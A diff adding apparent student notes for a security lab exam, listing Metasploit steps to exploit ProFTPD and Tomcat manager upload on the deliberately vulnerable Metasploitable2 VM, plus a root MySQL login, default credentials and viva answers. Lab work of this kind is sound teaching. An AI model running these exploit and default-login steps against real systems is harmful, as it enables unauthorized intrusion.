@@ -1,0 +1,52 @@
+SECURITY CONCEPTS LAB EXAM ASSIGNMENT 2 - COMPLETE STEP-BY-STEP NOTES
+
+LAB SETUP 1. Start VMware. 2. Start Kali Linux and Metasploitable2. 3.
+Login: Kali: kali/kali Metasploitable2: msfadmin/msfadmin
+
+CHECK IP Kali: ip a or ifconfig
+
+Victim: ifconfig
+
+CHECK CONNECTIVITY ping
+
+SCAN TARGET nmap -sV
+
+============================== Q1 FTP (ProFTPD)
+============================== msfconsole search proftpd use
+exploit/unix/ftp/proftpd_modcopy_exec show options set RHOSTS show
+options exploit
+
+Verify: pwd whoami uname -a
+
+============================== Q2 MySQL ==============================
+mysql -h -u root -p show databases; use mysql; show tables; exit
+
+============================== Q3 AJP13/Tomcat
+============================== msfconsole search tomcat use
+exploit/multi/http/tomcat_mgr_upload set RHOSTS set RPORT 8180 set
+HttpUsername tomcat set HttpPassword tomcat set LHOST exploit
+
+Verify: sysinfo pwd shell
+
+============================== Q4 HTTP Tomcat
+============================== Open: http://:8180
+
+Or use: use exploit/multi/http/tomcat_mgr_upload
+
+============================== IMPORTANT COMMANDS
+============================== ip a ifconfig ping nmap -sV msfconsole
+search use show options set RHOSTS set RPORT set HttpUsername set
+HttpPassword set LHOST exploit pwd whoami sysinfo shell exit
+
+============================== VIVA ============================== 1.
+What is Nmap? Network scanner.
+
+2.  What is Metasploit? Penetration testing framework.
+
+3.  What is RHOSTS? Target IP.
+
+4.  What is LHOST? Attacker IP.
+
+5.  What is Meterpreter? Advanced payload.
+
+6.  Why Metasploitable2? Intentionally vulnerable lab machine.
